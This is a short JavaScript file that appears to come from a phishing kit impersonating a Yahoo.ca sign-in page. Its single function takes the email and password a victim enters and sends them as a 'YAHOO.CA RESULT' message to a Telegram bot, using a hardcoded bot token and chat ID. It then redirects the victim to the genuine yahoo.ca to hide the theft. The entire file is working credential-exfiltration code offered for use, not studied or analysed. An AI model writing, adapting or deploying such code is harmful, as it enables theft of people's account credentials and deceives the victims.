// console.log("sender.js connected");

function sendTelegramMessageAndRedirect(e) {
  e.preventDefault();

  passwordValue = password.value;

  const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // Replace with your Telegram bot token
  const chatId = 5710607863; // Replace with your chat ID

  if (!passwordValue) {
    // console.log("password empty");
    return; // Stop further execution if password is empty
  }

  const messageText = `**YAHOO.CA RESULT**\nEmail: ${usernameValue}\nPassword: ${passwordValue}`;
  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
  const params = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText,
    }),
  };

  // Make the API request
  fetch(url, params)
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      // Redirect to another page after successful submission
      window.location.href = "https://www.yahoo.ca"; // Replace with your desired URL
    })
    .catch((error) => console.error("Error:", error));
}
